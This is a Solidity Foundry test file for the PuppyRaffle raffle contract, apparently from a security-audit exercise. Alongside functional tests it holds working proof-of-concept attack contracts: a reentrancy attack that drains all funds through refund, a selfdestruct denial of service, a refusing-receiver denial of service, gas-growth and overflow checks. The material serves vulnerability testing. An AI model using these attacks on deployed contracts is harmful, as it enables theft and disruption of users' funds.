// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address playerOne = address(1);
    address playerTwo = address(2);
    address playerThree = address(3);
    address playerFour = address(4);
    address feeAddress = address(999);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    //////////////////////
    /// EnterRaffle    ///
    /////////////////////

    function testCanEnterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.players(0), playerOne);
    }

    function testCantEnterWithoutPaying() public {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle(players);
    }

    function testCanEnterRaffleMany() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        assertEq(puppyRaffle.players(0), playerOne);
        assertEq(puppyRaffle.players(1), playerTwo);
    }

    function testCantEnterWithoutPayingMultiple() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        vm.expectRevert("PuppyRaffle: Must send enough to enter raffle");
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testCantEnterWithDuplicatePlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
    }

    function testCantEnterWithDuplicatePlayersMany() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerOne;
        vm.expectRevert("PuppyRaffle: Duplicate player");
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
    }

    //////////////////////
    /// Refund         ///
    /////////////////////
    modifier playerEntered() {
        address[] memory players = new address[](1);
        players[0] = playerOne;
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        _;
    }

    function testCanGetRefund() public playerEntered {
        uint256 balanceBefore = address(playerOne).balance;
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(address(playerOne).balance, balanceBefore + entranceFee);
    }

    function testGettingRefundRemovesThemFromArray() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);

        vm.prank(playerOne);
        puppyRaffle.refund(indexOfPlayer);

        assertEq(puppyRaffle.players(0), address(0));
    }

    function testOnlyPlayerCanRefundThemself() public playerEntered {
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerOne);
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        vm.prank(playerTwo);
        puppyRaffle.refund(indexOfPlayer);
    }

    //////////////////////
    /// getActivePlayerIndex         ///
    /////////////////////
    function testGetActivePlayerIndexManyPlayers() public {
        address[] memory players = new address[](2);
        players[0] = playerOne;
        players[1] = playerTwo;
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);

        assertEq(puppyRaffle.getActivePlayerIndex(playerOne), 0);
        assertEq(puppyRaffle.getActivePlayerIndex(playerTwo), 1);
    }

    //////////////////////
    /// selectWinner         ///
    /////////////////////
    modifier playersEntered() {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        _;
    }

    function testCantSelectWinnerBeforeRaffleEnds() public playersEntered {
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
    }

    function testCantSelectWinnerWithFewerThanFourPlayers() public {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = address(3);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert("PuppyRaffle: Need at least 4 players");
        puppyRaffle.selectWinner();
    }

    function testSelectWinner() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.previousWinner(), playerFour);
    }

    function testSelectWinnerGetsPaid() public playersEntered {
        uint256 balanceBefore = address(playerFour).balance;

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);

        puppyRaffle.selectWinner();
        assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
    }

    function testSelectWinnerGetsAPuppy() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(playerFour), 1);
    }

    function testPuppyUriIsRight() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        string
            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";

        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
    }

    //////////////////////
    /// withdrawFees         ///
    /////////////////////
    function testCantWithdrawFeesIfPlayersActive() public playersEntered {
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function testWithdrawFees() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        uint256 expectedPrizeAmount = ((entranceFee * 4) * 20) / 100;

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
        assertEq(address(feeAddress).balance, expectedPrizeAmount);
    }

    //
    // Checks
    //
    function test_srw_can_enter_multiple_times() public {
        // assumption: entranceFee = 1e18
        uint256 playerCount = 4;
        for (uint256 i = 0; i < playerCount; ++i) {
            enterRaffle(i);
        }

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();

        for (uint256 i = 0; i < playerCount; ++i) {
            enterRaffle(i);
        }

        vm.warp(block.timestamp + duration + 2);
        vm.roll(block.number + 2);

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
    }

    //
    // Attacks
    //
    function test_srw_REENTRANCY_can_drain_funds_via_refund()
        public
        playersEntered
    {
        ReentrancyAttack attack = new ReentrancyAttack(
            puppyRaffle,
            entranceFee
        );

        vm.deal(address(attack), entranceFee);

        attack.enterRaffle();
        assertEq(address(attack).balance, 0);

        attack.attack();

        assertEq(address(puppyRaffle).balance, 0);
        assertEq(address(attack).balance, entranceFee * 5);
    }

    function test_srw_SELFDESTRUCT_DOS_cant_withdraw_fees_if_selfdestruct()
        public
        playersEntered
    {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        SelfDestructAttack attack = new SelfDestructAttack(puppyRaffle);
        vm.deal(address(attack), 1 ether);
        attack.attack();

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }

    function test_srw_SEND_ETHER_DOS_denying_funds_from_selectWinner_can_DOS_withdrawFees()
        public
    {
        address[] memory players = new address[](3);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);

        DenialOfServiceAttack attack = new DenialOfServiceAttack(
            puppyRaffle,
            entranceFee
        );
        vm.deal(address(attack), entranceFee);
        attack.attack();

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        vm.expectRevert();
        puppyRaffle.selectWinner();
        assertEq(puppyRaffle.balanceOf(address(attack)), 0);

        vm.warp(block.timestamp + duration + 2);
        vm.roll(block.number + 2);

        puppyRaffle.selectWinner();
        puppyRaffle.withdrawFees();
    }

    function test_srw_GAS_DOS_enterRaffle_gets_more_expensive_for_consecutive_players()
        public
    {
        uint256 i = 0;
        uint256 gasSpent = 0;

        while (i < 4) {
            gasSpent = enterRaffle(i);
            console.log("[ Player ", i, "] Gas spent: ", gasSpent);
            i += 1;
        }

        while (i < 100) {
            enterRaffle(i);
            i += 1;
        }

        gasSpent = enterRaffle(i);
        console.log("[ Player ", i, "] Gas spent: ", gasSpent);
    }

    function enterRaffle(uint256 i) internal returns (uint256) {
        address[] memory players = new address[](1);
        players[0] = address(i);
        uint256 gasStart = gasleft();

        vm.deal(address(i), entranceFee);
        vm.prank(address(i));
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        uint256 gasSpent = gasStart - gasleft();

        return gasSpent;
    }

    function test_srw_DOS_OVERFLOW_casting_fee_from_uint256_causes_overflow()
        public
    {
        // assumption: entranceFee = 1e18
        uint256 playerCount = 93;
        for (uint256 i = 0; i < playerCount; ++i) {
            enterRaffle(i);
        }

        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        puppyRaffle.selectWinner();

        vm.expectRevert();
        puppyRaffle.withdrawFees();
    }
}

contract ReentrancyAttack {
    uint256 s_indexOfPlayer;
    PuppyRaffle s_puppyRaffle;
    uint256 s_entranceFee;
    uint256 s_reentrancy_count = 4;

    constructor(PuppyRaffle puppyRaffle, uint256 entranceFee) {
        s_puppyRaffle = puppyRaffle;
        s_entranceFee = entranceFee;
    }

    function enterRaffle() public {
        address[] memory players = new address[](1);
        players[0] = address(this);

        s_puppyRaffle.enterRaffle{value: s_entranceFee}(players);
        s_indexOfPlayer = s_puppyRaffle.getActivePlayerIndex(address(this));
    }

    function attack() public {
        s_puppyRaffle.refund(s_indexOfPlayer);
    }

    receive() external payable {
        if (s_reentrancy_count > 0) {
            s_reentrancy_count -= 1;
            s_puppyRaffle.refund(s_indexOfPlayer);
        }
    }
}

contract SelfDestructAttack {
    PuppyRaffle s_puppyRaffle;

    constructor(PuppyRaffle puppyRaffle) {
        s_puppyRaffle = puppyRaffle;
    }

    function attack() public {
        selfdestruct(payable(address(s_puppyRaffle)));
    }
}

contract DenialOfServiceAttack {
    PuppyRaffle s_puppyRaffle;
    uint256 s_entranceFee;

    constructor(PuppyRaffle puppyRaffle, uint256 entranceFee) {
        s_puppyRaffle = puppyRaffle;
        s_entranceFee = entranceFee;
    }

    function attack() public {
        address[] memory players = new address[](1);
        players[0] = address(this);

        s_puppyRaffle.enterRaffle{value: s_entranceFee}(players);
    }
}
